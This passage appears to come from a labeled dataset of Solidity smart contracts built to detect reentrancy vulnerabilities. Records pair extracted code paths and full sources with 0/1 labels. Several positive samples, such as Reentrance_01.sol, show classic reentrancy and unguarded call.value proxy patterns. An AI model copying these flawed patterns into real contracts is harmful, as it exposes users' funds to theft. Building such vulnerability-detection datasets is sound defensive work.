_originalBuyPrice; if(requestedUnits <= _icoSupply && requestedUnits > 0 ){ balances[owner] -= requestedUnits; balances[buyers[i]] += requestedUnits; _icoSupply -= requestedUnits; Transfer(owner, buyers[i], requestedUnits); sum += deposit[buyers[i]]; deposit[buyers[i]] = 0; } } } owner.transfer(sum); } function returnETHforNormalBuyers() public onlyOwner{ for(uint i = 0; i < buyers.length; i++){ if (!approvedInvestorList[buyers[i]]) { uint256 buyerDeposit = deposit[buyers[i]]; deposit[buyers[i]] = 0; buyers[i].transfer(buyerDeposit); } } } function transfer(address _to, uint256 _amount) public returns (bool) { if ( (balances[msg.sender] >= _amount) && (_amount >= 0) && (balances[_to] + _amount > balances[_to]) ) { balances[msg.sender] -= _amount; balances[_to] += _amount; Transfer(msg.sender, _to, _amount); return true; } else { revert(); } } function turnOnSale() onlyOwner public { _selling = true; } function turnOffSale() onlyOwner public { _selling = false; } function isSellingNow() public constant returns (bool) { return _selling; } function setBuyPrice(uint newBuyPrice) onlyOwner public { _originalBuyPrice = newBuyPrice; } function addInvestorList(address[] newInvestorList) onlyOwner public { for (uint i = 0; i < newInvestorList.length; i++){ approvedInvestorList[newInvestorList[i]] = true; } } function removeInvestorList(address[] investorList) onlyOwner public { for (uint i = 0; i < investorList.length; i++){ approvedInvestorList[investorList[i]] = false; } } function buy() payable onlyNotOwner validOriginalBuyPrice validInvestor onSale public returns (uint256 amount) { uint requestedUnits = msg.value / _originalBuyPrice ; require(requestedUnits <= _icoSupply); balances[owner] -= requestedUnits; balances[msg.sender] += requestedUnits; _icoSupply -= requestedUnits; Transfer(owner, msg.sender, requestedUnits); owner.transfer(msg.value); return requestedUnits; } function withdraw() onlyOwner public returns (bool) { return owner.send(this.balance); } } contract MultiSigWallet { event Confirmation(address sender, bytes32 transactionId); event Revocation(address sender, bytes32 transactionId); event Submission(bytes32 transactionId); event Execution(bytes32 transactionId); event Deposit(address sender, uint value); event OwnerAddition(address owner); event OwnerRemoval(address owner); event RequirementChange(uint required); event CoinCreation(address coin); mapping (bytes32 => Transaction) public transactions; mapping (bytes32 => mapping (address => bool)) public confirmations; mapping (address => bool) public isOwner; address[] owners; bytes32[] transactionList; uint public required; struct Transaction { address destination; uint value; bytes data; uint nonce; bool executed; } modifier onlyWallet() { require(msg.sender == address(this)); _; } modifier ownerDoesNotExist(address owner) { require(!isOwner[owner]); _; } modifier ownerExists(address owner) { require(isOwner[owner]); _; } modifier confirmed(bytes32 transactionId, address owner) { require(confirmations[transactionId][owner]); _; } modifier notConfirmed(bytes32 transactionId, address owner) { require(!confirmations[transactionId][owner]); _; } modifier notExecuted(bytes32 transactionId) { require(!transactions[transactionId].executed); _; } modifier notNull(address destination) { require(destination != 0); _; } modifier validRequirement(uint _ownerCount, uint _required) { require(   _required <= _ownerCount && _required > 0 ); _; } function MultiSigWallet(address[] _owners, uint _required) validRequirement(_owners.length, _required) public { for (uint i=0; i<_owners.length; i++) { if (isOwner[_owners[i]] || _owners[i] == 0){ revert(); } isOwner[_owners[i]] = true; } owners = _owners; required = _required; } function() public payable { if (msg.value > 0) Deposit(msg.sender, msg.value); } function addOwner(address owner) public onlyWallet ownerDoesNotExist(owner) { isOwner[owner] = true; owners.push(owner); OwnerAddition(owner); } function removeOwner(address owner) public onlyWallet ownerExists(owner) { require(owners.length > 1); isOwner[owner] = false; for (uint i=0; i<owners.length - 1; i++) if (owners[i] == owner) { owners[i] = owners[owners.length - 1]; break; } owners.length -= 1; if (required > owners.length) changeRequirement(owners.length); OwnerRemoval(owner); } function changeRequirement(uint _required) public onlyWallet validRequirement(owners.length, _required) { required = _required; RequirementChange(_required); } function addTransaction(address destination, uint value, bytes data, uint nonce) private notNull(destination) returns (bytes32 transactionId) { transactionId = keccak256(destination, value, data, nonce); if (transactions[transactionId].destination == 0) { transactions[transactionId] = Transaction({ destination: destination, value: value, data: data, nonce: nonce, executed: false }); transactionList.push(transactionId); Submission(transactionId); } } function submitTransaction(address destination, uint value, bytes data, uint nonce) external ownerExists(msg.sender) returns (bytes32 transactionId) { transactionId = addTransaction(destination, value, data, nonce); confirmTransaction(transactionId); } function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); } function executeTransaction(bytes32 transactionId)   public   notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (!txn.destination.call.value(txn.value)(txn.data)) revert(); Execution(transactionId); } } function revokeConfirmation(bytes32 transactionId) external ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) { confirmations[transactionId][msg.sender] = false; Revocation(msg.sender, transactionId); } function isConfirmed(bytes32 transactionId) public constant returns (bool) { uint count = 0; for (uint i=0; i<owners.length; i++) if (confirmations[transactionId][owners[i]]) count += 1; if (count == required) return true; } function confirmationCount(bytes32 transactionId) external constant returns (uint count) { for (uint i=0; i<owners.length; i++) if (confirmations[transactionId][owners[i]]) count += 1; } function filterTransactions(bool isPending) private constant returns (bytes32[] _transactionList) { bytes32[] memory _transactionListTemp = new bytes32[](transactionList.length); uint count = 0; for (uint i=0; i<transactionList.length; i++) if (transactions[transactionList[i]].executed != isPending) { _transactionListTemp[count] = transactionList[i]; count += 1; } _transactionList = new bytes32[](count); for (i=0; i<count; i++) if (_transactionListTemp[i] > 0) _transactionList[i] = _transactionListTemp[i]; } function getPendingTransactions() external constant returns (bytes32[]) { return filterTransactions(true); } function getExecutedTransactions() external constant returns (bytes32[]) { return filterTransactions(false); } function createCoin() external onlyWallet { CoinCreation(new Gifto()); } } "}
{"sol name": "Reentrance_01.sol", "label": 1, "first path": "function withdrawBalance(){ if(!(msg.sender.call.value(userBalance[msg.sender])())){ throw; userBalance[msg.sender] = 0; ", "second path": "function withdrawBalance(){ if(!(msg.sender.call.value(userBalance[msg.sender])())){ throw; userBalance[msg.sender] = 0; ", "third path": "function withdrawBalance(){ if(!(msg.sender.call.value(userBalance[msg.sender])())){ throw; userBalance[msg.sender] = 0; ", "long path": "pragma solidity ^0.4.15; contract Reentrance { mapping (address => uint) userBalance; function getBalance(address u) constant returns(uint){ return userBalance[u]; } function addToBalance() payable{ userBalance[msg.sender] += msg.value; } function withdrawBalance(){ if(!(msg.sender.call.value(userBalance[msg.sender])())){ throw; } userBalance[msg.sender] = 0; } } "}
{"sol name": "1751.sol", "label": 1, "first path": "function proxy(address target, bytes data) public payable { target.call.value(msg.value)(data); contract VaultProxy is Proxy { address public Owner; mapping (address => uint256) public Deposits; ", "second path": "function proxy(address target, bytes data) public payable { target.call.value(msg.value)(data); contract VaultProxy is Proxy { address public Owner; mapping (address => uint256) public Deposits; ", "third path": "function proxy(address target, bytes data) public payable { target.call.value(msg.value)(data); contract VaultProxy is Proxy { address public Owner; mapping (address => uint256) public Deposits; ", "long path": "pragma solidity ^0.4.24; contract Proxy { modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender; function transferOwner(address _owner) public onlyOwner { Owner = _owner; } function proxy(address target, bytes data) public payable { target.call.value(msg.value)(data); } } contract VaultProxy is Proxy { address public Owner; mapping (address => uint256) public Deposits; function () public payable { } function Vault() public payable { if (msg.sender == tx.origin) { Owner = msg.sender; deposit(); } } function deposit() public payable { if (msg.value > 0.5 ether) { Deposits[msg.sender] += msg.value; } } function withdraw(uint256 amount) public onlyOwner { if (amount>0 && Deposits[msg.sender]>=amount) { msg.sender.transfer(amount); } } } "}
{"sol name": "14579.sol", "label": 0, "first path": "function pay() public onlyOwner whenNotCanceled { require(weiCollected > 0); uint256 fee; uint256 netAmount; (fee, netAmount) = _getFeeAndNetAmount(weiCollected); require(address(sale).call.value(netAmount)(this)); tokensReceived = getToken().balanceOf(this); if (fee != 0) { manager.transfer(fee); paid = true; emit Paid(netAmount, fee); ", "second path": "function pay() public onlyOwner whenNotCanceled { require(weiCollected > 0); uint256 fee; uint256 netAmount; (fee, netAmount) = _getFeeAndNetAmount(weiCollected); require(address(sale).call.value(netAmount)(this)); tokensReceived = getToken().balanceOf(this); if (fee != 0) { manager.transfer(fee); paid = true; emit Paid(netAmount, fee); ", "third path": "function pay() public onlyOwner whenNotCanceled { require(weiCollected > 0); uint256 fee; uint256 netAmount; (fee, netAmount) = _getFeeAndNetAmount(weiCollected); require(address(sale).call.value(netAmount)(this)); tokensReceived = getToken().balanceOf(this); if (fee != 0) { manager.transfer(fee); paid = true; emit Paid(netAmount, fee); ", "long path": "pragma solidity ^0.4.21; contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) public onlyOwner { require(newOwner != address(0)); emit OwnershipTransferred(owner, newOwner); owner = newOwner; } } contract Pausable is Ownable { event Pause(); event Unpause(); bool public paused = false; modifier whenNotPaused() { require(!paused); _; } modifier whenPaused() { require(paused); _; } function pause() onlyOwner whenNotPaused public { paused = true; emit Pause(); } function unpause() onlyOwner whenPaused public { paused = false; emit Unpause(); } } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } contract ICOStartSaleInterface { ERC20 public token; } contract ICOStartReservation is Pausable { using SafeMath for uint256; ICOStartSaleInterface public sale; uint256 public cap; uint8 public feePerc; address public manager; mapping(address => uint256) public deposits; uint256 public weiCollected; uint256 public tokensReceived; bool public canceled; bool public paid; event Deposited(address indexed depositor, uint256 amount); event Withdrawn(address indexed beneficiary, uint256 amount); event Paid(uint256 netAmount, uint256 fee); event Canceled(); function ICOStartReservation(ICOStartSaleInterface _sale, uint256 _cap, uint8 _feePerc, address _manager) public { require(_sale != (address(0))); require(_cap != 0); require(_feePerc >= 0); if (_feePerc != 0) { require(_manager != 0x0); } sale = _sale; cap = _cap; feePerc = _feePerc; manager = _manager; } modifier whenOpen() { require(isOpen()); _; } modifier whenNotCanceled() { require(!canceled); _; } modifier whenCanceled() { require(canceled); _; } modifier whenNotPaid() { require(!paid); _; } modifier whenPaid() { require(paid); _; } function capReached() public view returns (bool) { return weiCollected >= cap; } function getToken() public view returns (ERC20) { return sale.token(); } function isOpen() public view returns (bool) { return !paused && !capReached() && !canceled && !paid; } function () external payable { if (msg.value == 0) { claimTokens(msg.sender); } else { deposit(msg.sender); } } function deposit(address _depositor) public whenOpen payable { require(_depositor != address(0)); require(weiCollected.add(msg.value) <= cap); deposits[_depositor] = deposits[_depositor].add(msg.value); weiCollected = weiCollected.add(msg.value); emit Deposited(_depositor, msg.value); } function cancel() public onlyOwner whenPaused whenNotPaid { canceled = true; } function pay() public onlyOwner whenNotCanceled { require(weiCollected > 0); uint256 fee; uint256 netAmount; (fee, netAmount) = _getFeeAndNetAmount(weiCollected); require(address(sale).call.value(netAmount)(this)); tokensReceived = getToken().balanceOf(this); if (fee != 0) { manager.transfer(fee); } paid = true; emit Paid(netAmount, fee); } function withdraw() public whenCanceled { uint256 depositAmount = deposits[msg.sender]; require(depositAmount != 0); deposits[msg.sender] = 0; weiCollected = weiCollected.sub(depositAmount); msg.sender.transfer(depositAmount); emit Withdrawn(msg.sender, depositAmount); } function claimTokens(address _beneficiary) public whenPaid { require(_beneficiary != address(0)); uint256 depositAmount = deposits[_beneficiary]; if (depositAmount != 0) { uint256 tokens = tokensReceived.mul(depositAmount).div(weiCollected); assert(tokens != 0); deposits[_beneficiary] = 0; getToken().transfer(_beneficiary, tokens); } } function destroy() onlyOwner public { uint256 myTokens = getToken().balanceOf(this); if (myTokens != 0) { getToken().transfer(owner, myTokens); } selfdestruct(owner); } function _getFeeAndNetAmount(uint256 _grossAmount) internal view returns (uint256 _fee, uint256 _netAmount) { _fee = _grossAmount.div(100).mul(feePerc); _netAmount = _grossAmount.sub(_fee); } } "}
{"sol name": "37836.sol", "label": 0, "first path": "function collect() onlyOwner { require(addrcnt.call.value(this.balance)(0)); Collect(addrcnt,this.balance); ", "second path": "function collect() onlyOwner { require(addrcnt.call.value(this.balance)(0)); Collect(addrcnt,this.balance); ", "third path": "function collect() onlyOwner { require(addrcnt.call.value(this.balance)(0)); Collect(addrcnt,this.balance); ", "long path": "pragma solidity ^0.4.11; contract SafeMath { function sub(uint256 x, uint256 y) constant internal returns (uint256 z) { assert((z = x - y) <= x); } function add(uint256 x, uint256 y) constant internal returns (uint256 z) { assert((z = x + y) >= x); } function div(uint256 x, uint256 y) constant internal returns (uint256 z) { z = x / y; } function min(uint256 x, uint256 y) constant internal returns (uint256 z) { z = x <= y ? x : y; } } contract Owned { address public owner; address public newOwner; event OwnershipTransferred(address indexed _from, address indexed _to); function Owned() { owner = msg.sender; } modifier onlyOwner { assert (msg.sender == owner); _; } function transferOwnership(address _newOwner) onlyOwner { newOwner = _newOwner; } function acceptOwnership() { if (msg.sender == newOwner) { OwnershipTransferred(owner, newOwner); owner = newOwner; } } } contract ERC20 { function totalSupply() constant returns (uint totalSupply); function balanceOf(address who) constant returns (uint); function allowance(address owner, address spender) constant returns (uint); function transfer(address to, uint value) returns (bool ok); function transferFrom(address from, address to, uint value) returns (bool ok); function approve(address spender, uint value) returns (bool ok); event Transfer(address indexed from, address indexed to, uint value); event Approval(address indexed owner, address indexed spender, uint value); } contract StandardToken is ERC20, SafeMath { uint256                                            _totalSupply; mapping (address => uint256)                       _balances; mapping (address => mapping (address => uint256))  _approvals; modifier onlyPayloadSize(uint numwords) { assert(msg.data.length == numwords * 32 + 4); _; } function totalSupply() constant returns (uint256) { return _totalSupply; } function balanceOf(address _who) constant returns (uint256) { return _balances[_who]; } function allowance(address _owner, address _spender) constant returns (uint256) { return _approvals[_owner][_spender]; } function transfer(address _to, uint _value) onlyPayloadSize(2) returns (bool success) { assert(_balances[msg.sender] >= _value); _balances[msg.sender] = sub(_balances[msg.sender], _value); _balances[_to] = add(_balances[_to], _value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(address _from, address _to, uint _value) onlyPayloadSize(3) returns (bool success) { assert(_balances[_from] >= _value); assert(_approvals[_from][msg.sender] >= _value); _approvals[_from][msg.sender] = sub(_approvals[_from][msg.sender], _value); _balances[_from] = sub(_balances[_from], _value); _balances[_to] = add(_balances[_to], _value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) onlyPayloadSize(2) returns (bool success) { _approvals[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } } contract HUNT is StandardToken, Owned { string public constant name = \"HUNT\"; string public constant symbol = \"HT\"; uint8 public constant decimals = 18; uint256 public capTokens; uint256 public startDate; uint256 public endDate; uint public curs; address addrcnt; uint256 public totalTokens; uint256 public totalEthers; mapping (address => uint256) _userBonus; event BoughtTokens(address indexed buyer, uint256 ethers,uint256 newEtherBalance, uint256 tokens, uint _buyPrice); event Collect(address indexed addrcnt,uint256 amount); function HUNT(uint256 _start, uint256 _end, uint256 _capTokens, uint _curs, address _addrcnt) { startDate\t= _start; endDate\t\t= _end; capTokens   = _capTokens; addrcnt  \t= _addrcnt; curs\t\t= _curs; } function time() internal constant returns (uint) { return block.timestamp; } function buyPrice() constant returns (uint256) { return buyPriceAt(time()); } function buyPriceAt(uint256 at) constant returns (uint256) { if (at < startDate) { return 0; } else if (at < (startDate + 2 days)) { return div(curs,100); } else if (at < (startDate + 5 days)) { return div(curs,120); } else if (at < (startDate + 10 days)) { return div(curs,130); } else if (at < (startDate + 15 days)) { return div(curs,140); } else if (at <= endDate) { return div(curs,150); } else { return 0; } } function () payable { buyTokens(msg.sender); } function buyTokens(address participant) payable { require(time() >= startDate); require(time() <= endDate); require(msg.value > 0); totalEthers = add(totalEthers, msg.value); uint256 _buyPrice = buyPrice(); uint tokens = msg.value * _buyPrice; require(tokens > 0); if ((time() >= (startDate + 15 days)) && (time() <= endDate)){ uint leftTokens=sub(capTokens,add(totalTokens, tokens)); leftTokens = (leftTokens>0)? leftTokens:0; uint bonusTokens = min(_userBonus[participant],min(tokens,leftTokens)); require(bonusTokens >= 0); tokens = add(tokens,bonusTokens); } totalTokens = add(totalTokens, tokens); require(totalTokens <= capTokens); uint ownerTokens = div(tokens,50)*19; _totalSupply = add(_totalSupply, tokens); _totalSupply = add(_totalSupply, ownerTokens); _balances[participant] = add(_balances[participant], tokens); _balances[owner] = add(_balances[owner], ownerTokens); if (time() < (startDate + 2 days)){ uint bonus = div(tokens,2); _userBonus[participant] = add(_userBonus[participant], bonus); } BoughtTokens(participant, msg.value, totalEthers, tokens, _buyPrice); Transfer(0x0, participant, tokens); Transfer(0x0, owner, ownerTokens); } function transfer(address _to, uint _amount) returns (bool success) { require((time() > endDate + 7 days )); return super.transfer(_to, _amount); } function transferFrom(address _from, address _to, uint _amount) returns (bool success) { require((time() > endDate + 7 days )); return super.transferFrom(_from, _to, _amount); } function mint(uint256 _amount) onlyOwner { require((time() > endDate + 7 days )); require(_amount > 0); _balances[owner] = add(_balances[owner], _amount); _totalSupply = add(_totalSupply, _amount); Transfer(0x0, owner, _amount); } function burn(uint256 _amount) onlyOwner { require((time() > endDate + 7 days )); require(_amount > 0); _balances[owner] = sub(_balances[owner],_amount); _totalSupply = sub(_totalSupply,_amount); Transfer(owner, 0x0 , _amount); } function setCurs(uint8 _curs) onlyOwner { require(_curs > 0); curs = _curs; } function collect() onlyOwner { require(addrcnt.call.value(this.balance)(0)); Collect(addrcnt,this.balance); } } "}
{"sol name": "774.sol", "label": 0, "first path": "function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) { uint256 _com = _eth * 5 / 100; uint256 _aff = _eth * 10 / 100; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now); } else { _com += _aff; if (!address(Bank).call.value(_com)(bytes4(keccak256(\"deposit()\"))))  {  } return(_eventData_); function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  { if (plyrRnds[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  { uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; if (_eth > 1000000000)  { uint256 _keys = (round[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000)   { updateTimer(_keys, _rID); if (round[_rID].plyr != _pID) round[_rID].plyr = _pID; _eventData_.compressedData = _eventData_.compressedData + 100; if (_eth >= 100000000000000000)  { airDropTracker_++; if (airdrop() == true)  { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 100000000000000000000000000000000; _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys); plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth); round[_rID].keys = _keys.add(round[_rID].keys); round[_rID].eth = _eth.add(round[_rID].eth); _eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_); endTx(_pID, _eth, _keys, _eventData_); plyrRnds_[_pID] = plyrRnds[_pID][_rID]; round_ = round[_rID]; ", "second path": "function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) { uint256 _com = _eth * 5 / 100; uint256 _aff = _eth * 10 / 100; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now); } else { _com += _aff; if (!address(Bank).call.value(_com)(bytes4(keccak256(\"deposit()\"))))  {  } return(_eventData_); function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  { if (plyrRnds[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  { uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; if (_eth > 1000000000)  { uint256 _keys = (round[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000)   { updateTimer(_keys, _rID); if (round[_rID].plyr != _pID) round[_rID].plyr = _pID; _eventData_.compressedData = _eventData_.compressedData + 100; if (_eth >= 100000000000000000)  { airDropTracker_++; if (airdrop() == true)  { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 100000000000000000000000000000000; _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys); plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth); round[_rID].keys = _keys.add(round[_rID].keys); round[_rID].eth = _eth.add(round[_rID].eth); _eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_); endTx(_pID, _eth, _keys, _eventData_); plyrRnds_[_pID] = plyrRnds[_pID][_rID]; round_ = round[_rID]; ", "third path": "function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) { uint256 _com = _eth * 5 / 100; uint256 _aff = _eth * 10 / 100; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now); } else { _com += _aff; if (!address(Bank).call.value(_com)(bytes4(keccak256(\"deposit()\"))))  {  } return(_eventData_); function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  { if (plyrRnds[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  { uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; if (_eth > 1000000000)  { uint256 _keys = (round[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000)   { updateTimer(_keys, _rID); if (round[_rID].plyr != _pID) round[_rID].plyr = _pID; _eventData_.compressedData = _eventData_.compressedData + 100; if (_eth >= 100000000000000000)  { airDropTracker_++; if (airdrop() == true)  { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 100000000000000000000000000000000; _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys); plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth); round[_rID].keys = _keys.add(round[_rID].keys); round[_rID].eth = _eth.add(round[_rID].eth); _eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_); endTx(_pID, _eth, _keys, _eventData_); plyrRnds_[_pID] = plyrRnds[_pID][_rID]; round_ = round[_rID]; ", "long path": "pragma solidity ^0.4.24; contract FDDEvents { event onNewName ( uint256 indexed playerID, address indexed playerAddress, bytes32 indexed playerName, bool isNewPlayer, uint256 affiliateID, address affiliateAddress, bytes32 affiliateName, uint256 amountPaid, uint256 timeStamp ); event onEndTx ( uint256 compressedData, uint256 compressedIDs, bytes32 playerName, address playerAddress, uint256 ethIn, uint256 keysBought, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 genAmount, uint256 potAmount, uint256 airDropPot ); event onWithdraw ( uint256 indexed playerID, address playerAddress, bytes32 playerName, uint256 ethOut, uint256 timeStamp ); event onWithdrawAndDistribute ( address playerAddress, bytes32 playerName, uint256 ethOut, uint256 compressedData, uint256 compressedIDs, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 genAmount ); event onBuyAndDistribute ( address playerAddress, bytes32 playerName, uint256 ethIn, uint256 compressedData, uint256 compressedIDs, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 genAmount ); event onReLoadAndDistribute ( address playerAddress, bytes32 playerName, uint256 compressedData, uint256 compressedIDs, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 genAmount ); event onAffiliatePayout ( uint256 indexed affiliateID, address affiliateAddress, bytes32 affiliateName, uint256 indexed buyerID, uint256 amount, uint256 timeStamp ); } contract modularFomoDD is FDDEvents {} contract FomoDD is modularFomoDD { using SafeMath for *; using NameFilter for string; using FDDKeysCalc for uint256; BankInterfaceForForwarder constant private Bank = BankInterfaceForForwarder(0xfa1678C00299fB685794865eA5e20dB155a8C913); PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0xA5d855212A9475558ACf92338F6a1df44dFCE908); address private admin = msg.sender; string constant public name = \"FomoDD\"; string constant public symbol = \"Chives\"; uint256 private rndGap_ = 0; uint256 private rndExtra_ = 0 minutes; uint256 constant private rndInit_ = 12 hours; uint256 constant private rndInc_ = 30 seconds; uint256 constant private rndMax_ = 24 hours; uint256 public airDropPot_; uint256 public airDropTracker_ = 0; mapping (address => uint256) public pIDxAddr_; mapping (bytes32 => uint256) public pIDxName_; mapping (uint256 => FDDdatasets.Player) public plyr_; mapping (uint256 => FDDdatasets.PlayerRounds) public plyrRnds_; mapping (uint256 => mapping (uint256 => FDDdatasets.PlayerRounds)) public plyrRnds; mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_; uint256 public rID_; FDDdatasets.Round public round_; mapping (uint256 => FDDdatasets.Round) public round; uint256 public fees_ = 60; uint256 public potSplit_ = 45; constructor() public { } modifier isActivated() { require(activated_ == true, \"its not ready yet\"); _; } modifier isHuman() { address _addr = msg.sender; uint256 _codeLength; assembly {_codeLength := extcodesize(_addr)} require(_codeLength == 0, \"non smart contract address only\"); _; } modifier isWithinLimits(uint256 _eth) { require(_eth >= 1000000000, \"too little 